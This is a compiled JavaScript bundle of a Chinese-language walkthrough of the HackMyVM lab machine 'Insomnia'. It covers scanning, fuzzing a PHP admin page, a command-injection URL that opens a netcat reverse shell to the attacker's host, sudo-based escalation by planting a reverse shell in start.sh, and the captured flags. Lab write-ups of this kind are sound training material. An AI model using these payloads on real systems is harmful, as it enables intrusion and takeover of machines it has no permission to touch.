"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8791],{30758:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>t,default:()=>h,frontMatter:()=>r,metadata:()=>c,toc:()=>d});var a=s(85893),i=s(11151);const r={},t="Insomnia",c={id:"HackMyVM/Machines/Insomnia/index",title:"Insomnia",description:"[Linux VM] [Tested on VirtualBox] created by || alienum",source:"@site/docs/HackMyVM/Machines/Insomnia/index.md",sourceDirName:"HackMyVM/Machines/Insomnia",slug:"/HackMyVM/Machines/Insomnia/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Insomnia/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Insomnia/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Hommie",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Hommie/"},next:{title:"Locker",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Locker/"}},l={},d=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"\u5bf9 <code>/administration.php</code> \u6587\u4ef6\u8fdb\u884c fuzz \u653b\u51fb",id:"\u5bf9-administrationphp-\u6587\u4ef6\u8fdb\u884c-fuzz-\u653b\u51fb",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"root pwned",id:"root-pwned",level:2}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"insomnia",children:"Insomnia"})}),"\n",(0,a.jsxs)(n.admonition,{type:"note",children:[(0,a.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || alienum"}),(0,a.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-01-28"}),(0,a.jsx)(n.p,{children:"\u2714\ufe0f MD5 // f6808bfec80c7348aeb449d9f2305bbd"}),(0,a.jsx)(n.p,{children:"\u2620 Root // 102"}),(0,a.jsx)(n.p,{children:"\ud83d\udc80 User // 108"}),(0,a.jsx)(n.p,{children:"\ud83d\udcddNotes //\nThis admin is very careless."})]}),"\n",(0,a.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:s(53899).Z+"",width:"1020",height:"687"})}),"\n",(0,a.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.112\n"})}),"\n",(0,a.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.112\nHost is up (0.00054s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)\n|_http-title: Chat\n|_http-open-proxy: Proxy might be redirecting requests\nMAC Address: 08:00:27:D8:30:07 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"\u8bbf\u95ee /",src:s(11325).Z+"",width:"1139",height:"763"})}),"\n",(0,a.jsx)(n.p,{children:"\u53d1\u73b0\u7c7b\u4f3c\u4e8e\u4e00\u4e2a\u5728\u7ebf\u804a\u5929\u5e73\u53f0\uff0c\u5e76\u4e14\u7ecf\u8fc7\u63a2\u6d4b\uff0c\u53d1\u73b0\u5b58\u5728 XSS \u653b\u51fb\u7684\u53ef\u80fd\u6027"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u5f97\u5230\u4ee5\u4e0b\u8def\u5f84"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"[20:22:07] 200 -   65B  - /administration.php\n[20:22:10] 200 -    2KB - /chat.js\n[20:22:25] 200 -   20B  - /start.sh\n"})}),"\n",(0,a.jsxs)(n.h2,{id:"\u5bf9-administrationphp-\u6587\u4ef6\u8fdb\u884c-fuzz-\u653b\u51fb",children:["\u5bf9 ",(0,a.jsx)(n.code,{children:"/administration.php"})," \u6587\u4ef6\u8fdb\u884c fuzz \u653b\u51fb"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh 65 'http://192.168.56.112:8080/administration.php?FUZZ=test'\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.112:8080/administration.php?FUZZ=test\nTotal requests: 951\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000000485:   200        2 L      12 W       69 Ch       \"logfile\"\n\nTotal time: 2.479255\nProcessed Requests: 951\nFiltered Requests: 950\nRequests/sec.: 383.5828\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u53d1\u73b0\u5b58\u5728\u53c2\u6570\u53e3\uff1a",(0,a.jsx)(n.code,{children:"logfile"})]}),"\n",(0,a.jsx)(n.p,{children:"\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u5176\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u6ce8\u5165"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.112:8080/administration.php?logfile=;nc%20192.168.56.102%209999%20-e%20/bin/bash;\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u5f97\u5230 shell \u4f1a\u8bdd"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[20:29:03] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                                            __main__.py:164\n[20:29:45] received connection from 192.168.56.112:47920                                                                                                                                                                         bind.py:84\n[20:29:46] 192.168.56.112:47920: registered new host w/ db                                                                                                                                                                   manager.py:957\n(local) pwncat$ back\n(remote) www-data@insomnia:/var/www/html$ whoami\nwww-data\n(remote) www-data@insomnia:/var/www/html$\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for www-data on insomnia:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on insomnia:\n    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/newgrp\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7531\u4e8e ",(0,a.jsx)(n.code,{children:"julia"})," \u7528\u6237\u53ef\u4ee5\u5728\u65e0\u9700\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u6267\u884c ",(0,a.jsx)(n.code,{children:"/var/www/html/start.sh"})," \u6587\u4ef6\uff0c\u5e76\u4e14 ",(0,a.jsx)(n.code,{children:"/var/www/html/start.sh"})," \u6587\u4ef6\u662f ",(0,a.jsx)(n.code,{children:"www-data"})," \u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\uff0c\u4e8e\u662f\u5b58\u5728\u63d0\u6743\u53ef\u80fd\u6027"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5c06 bash \u53cd\u5f39 shell \u7684 poc \u5199\u5165 ",(0,a.jsx)(n.code,{children:"/var/www/html/start.sh"})," \uff0c\u7136\u540e\u6267\u884c"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"sudo -u julia /bin/bash /var/www/html/start.sh\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5373\u53ef\u6536\u5230\u53cd\u8fde\u7684shell\u4f1a\u8bdd"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 8888\n[20:35:57] Welcome to pwncat \ud83d\udc08!                                                                                      __main__.py:164\n[20:38:27] received connection from 192.168.56.112:55218                                                                   bind.py:84\n[20:38:27] 192.168.56.112:55218: registered new host w/ db                                                             manager.py:957\n(local) pwncat$ back\n(remote) julia@insomnia:/var/www/html$ whoami\njulia\n(remote)\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) julia@insomnia:/home/julia$ cat user.txt \n\n~~~~~~~~~~~~~\\\nUSER INSOMNIA\n~~~~~~~~~~~~~\nFlag : [c2e285cb33cecdbeb83d2189e983a8c0]\n"})}),"\n",(0,a.jsx)(n.admonition,{type:"warning",children:(0,a.jsxs)(n.p,{children:["\u6b64\u9776\u673a\u7684\u670d\u52a1\u6781\u5bb9\u6613\u88ab\u6253\u6302\u6389\uff0c\u5982\u679c\u524d\u9762\u4fee\u6539\u4e86 ",(0,a.jsx)(n.code,{children:"/var/www/html/start.sh"})," \u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u4f1a\u5bfc\u81f4\u5373\u4f7f\u9776\u673a\u91cd\u542f\u540e\u4e5f\u65e0\u6cd5\u542f\u52a8web\u670d\u52a1\uff0c\u5bfc\u81f4\u6b7b\u9898"]})}),"\n",(0,a.jsxs)(n.p,{children:["\u540e\u7eed\u5f97\u5230 ",(0,a.jsx)(n.code,{children:"julia"})," \u7684\u6743\u9650\u4e4b\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u8ba1\u5212\u4efb\u52a1\u6765\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u63d0\u6743"]}),"\n",(0,a.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="/root/root.txt"',children:"\n~~~~~~~~~~~~~~~\\\nROOTED INSOMNIA\n~~~~~~~~~~~~~~~\nFlag : [c84baebe0faa2fcdc2f1a4a9f6e2fbfc]\n\nby Alienum with <3\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(o,{...e})}):o(e)}},53899:(e,n,s)=>{s.d(n,{Z:()=>a});const a=s.p+"assets/images/image_20231212-201200-925cd2ec8bbfa3b0c0b073059c2717bf.png"},11325:(e,n,s)=>{s.d(n,{Z:()=>a});const a=s.p+"assets/images/image_20231220-202045-34a6960ae512e54a46e51e8cf271ab1b.png"},11151:(e,n,s)=>{s.d(n,{Z:()=>c,a:()=>t});var a=s(67294);const i={},r=a.createContext(i);function t(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);